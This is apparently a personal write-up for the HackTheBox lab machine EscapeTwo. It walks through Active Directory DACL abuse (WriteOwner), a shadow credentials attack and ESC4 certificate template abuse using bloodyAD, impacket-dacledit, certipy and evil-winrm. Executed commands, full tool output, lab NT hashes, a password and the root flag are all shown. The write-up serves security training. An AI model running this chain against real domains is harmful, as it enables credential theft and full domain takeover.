
https://www.hackingarticles.in/abusing-ad-dacl-generic-all-permissions/


## WriteOwner
Consider the exploitation of Discretionary Access Control Lists (DACLs) using the WriteOwner permission. Abuse of the WriteOwner permission can lead to a change of the object’s owner to a user controlled by an attacker

## Shadow Credentials Attack (ESC4)
> **ESC4** abuses the Key Credentials property of Active Directory accounts, allowing an attacker to authenticate as another user using a certificate-based authentication bypass.

This attack will add malicious Key Credential to ca_svc and allows ryan to authenticate as ca_svc using certificate instead of a password.
## Example HTB EscapeTwo

https://www.pentestnotes.ru/en/writeups/hackthebox/escapetwo-htb-writeup/

1. Use bloodyAD to change the owner of the ca_svc object to the user ryan:
```sh
bloodyAD --host {host name} -d {domain name} -u {user} -p {password} set owner ca_svc ryan  
```

Executed command:
```sh
sudo bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan 
```

2. set FullControl permissions for ryan. Now we will be able to control the object from this user, including the ability to modify and delete it.
```sh
dacledit.py -action 'write' -rights 'FullControl' -principal '{user}' -target 'ca_svc' '{domain name}'/'{user}':'{password}'  
```

Executed command:
```sh
sudo impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

### Shadow Credentials Attack (ESC4)
3. The following certipy-ad command to automatically abuse the shadow account ca_svc. We connect to the domain controller by IP address (-dc-ip) and use the specified credentials for authentication.
```sh
certipy-ad shadow auto -u {user}@{domain} -p '{pass}' -dc-ip {ip} -ns {ip} -target {ip} -account ca_svc 
```

Executed command:
```sh
sudo certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target dc01.sequel.htb -account ca_svc
```

4. Look for vulnerabilities in the target host using Kerberos authentication.
```sh
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target {host name} -dc-ip {ip} -vulnerable -stdout
```

Executed command:
```sh
sudo KRB5CCNAME=$PWD/ca_svc.ccache certipy find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
```

5. The command below creates a certificate request using the DunderMifflinAuthentication template.
```sh
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target {host name} -dc-ip {ip}
```

Executed command:
```sh
sudo KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51
```

6. Creates a certificate request for the ca_svc account using the specified hashes and template:
```sh
certipy-ad req -u ca_svc -hashes :hashes -ca sequel-DC01-CA -target {host} -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@{domain} -ns {ip} -dns {ip}  
```

Executed command:
```sh
sudo certipy req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
```

7. Now it’s just a matter of authenticating the user using the PFX file that was obtained the step before:
```sh
certipy-ad auth -pfx {some.pfx} -dc-ip {ip}
```

Executed command:
```sh
sudo certipy auth -pfx ./administrator_10.pfx -dc-ip 10.10.11.51
```

In return, we get a hash.
```sh
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ sudo certipy auth -pfx ./administrator_10.pfx -dc-ip 10.10.11.51                                     
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator@sequel.htb'
    [1] DNS Host Name: '10.10.11.51'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

8. All that remains is to use evil-winrm and a fresh administrator hash.
```sh
evil-winrm -i dc01.sequel.htb -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

### All steps in One
```sh
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ sudo bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan 

sudo impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'

sudo certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target dc01.sequel.htb -account ca_svc

sudo KRB5CCNAME=$PWD/ca_svc.ccache certipy find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout

sudo KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51

sudo certipy req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
[!] S-1-5-21-548670397-972687484-3496335370-1114 is already the owner, no modification will be made
/usr/share/doc/python3-impacket/examples/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/share/doc/python3-impacket/examples/dacledit.py:110: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:111: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:112: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/share/doc/python3-impacket/examples/dacledit.py:114: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:115: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:116: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/share/doc/python3-impacket/examples/dacledit.py:117: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:118: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:120: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/share/doc/python3-impacket/examples/dacledit.py:121: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:123: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:124: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:125: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/share/doc/python3-impacket/examples/dacledit.py:126: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:127: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250318-013517.bak
[*] DACL modified successfully!
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'c3e3b965-783f-994a-be93-2098c6a68afa'
[*] Adding Key Credential with device ID 'c3e3b965-783f-994a-be93-2098c6a68afa' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'c3e3b965-783f-994a-be93-2098c6a68afa' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: SEQUEL.HTB
[+] Username retrieved from CCache: ca_svc
[+] Trying to resolve 'dc01.sequel.htb' at '10.10.11.51'
[+] Authenticating to LDAP server
[+] Using Kerberos Cache: /home/kali/HTB/EscapeTwo/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/dc01.sequel.htb'
[+] Got TGS for 'host/dc01.sequel.htb'
[+] Bound to ldap://10.10.11.51:389 - cleartext
[+] Default path: DC=sequel,DC=htb
[+] Configuration path: CN=Configuration,DC=sequel,DC=htb
[+] Adding Domain Computers to list of current user's SIDs
[+] List of current user's SIDs:
     SEQUEL.HTB\Authenticated Users (SEQUEL.HTB-S-1-5-11)
     SEQUEL.HTB\Domain Computers (S-1-5-21-548670397-972687484-3496335370-515)
     SEQUEL.HTB\Cert Publishers (S-1-5-21-548670397-972687484-3496335370-517)
     SEQUEL.HTB\Users (SEQUEL.HTB-S-1-5-32-545)
     SEQUEL.HTB\Domain Users (S-1-5-21-548670397-972687484-3496335370-513)
     SEQUEL.HTB\Denied RODC Password Replication Group (S-1-5-21-548670397-972687484-3496335370-572)
     SEQUEL.HTB\Everyone (SEQUEL.HTB-S-1-1-0)
     SEQUEL.HTB\Certification Authority (S-1-5-21-548670397-972687484-3496335370-1607)
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[+] Trying to get DCOM connection for: 10.10.11.51
[+] Using Kerberos Cache: /home/kali/HTB/EscapeTwo/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[+] Using Kerberos Cache: /home/kali/HTB/EscapeTwo/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[+] Connected to remote registry at 'DC01.sequel.htb' (10.10.11.51)
[*] Got CA configuration for 'sequel-DC01-CA'
[+] Resolved 'DC01.sequel.htb' from cache: 10.10.11.51
[+] Connecting to 10.10.11.51:80
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 50
[*] Got certificate with multiple identifications
    UPN: 'Administrator@sequel.htb'
    DNS Host Name: '10.10.11.51'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'
```


```sh
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ sudo certipy auth -pfx ./administrator_10.pfx -dc-ip 10.10.11.51                                     
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator@sequel.htb'
    [1] DNS Host Name: '10.10.11.51'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

```sh
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ evil-winrm -i dc01.sequel.htb -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/17/2025   8:39 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
1b9b26021efd6f998c86e339344fee5c
```